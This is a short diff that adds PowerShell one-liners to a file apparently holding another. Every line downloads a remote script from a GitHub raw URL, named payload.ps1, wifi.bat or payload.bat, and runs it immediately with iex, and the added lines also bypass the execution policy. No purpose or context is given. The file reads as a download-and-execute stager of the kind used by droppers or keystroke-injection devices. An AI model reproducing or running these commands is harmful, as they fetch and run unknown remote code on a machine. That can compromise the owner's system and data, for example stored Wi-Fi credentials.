@@ -1,1 +1,4 @@
 powershell -Command "& {iwr -useb 'https://raw.githubusercontent.com/kaminarinokoky/BLAH/refs/heads/main/payload.ps1' | iex}"
+
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaminarinokoky/BLAH/refs/heads/main/wifi.bat'))"
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaminarinokoky/BLAH/refs/heads/main/payload.bat'))"
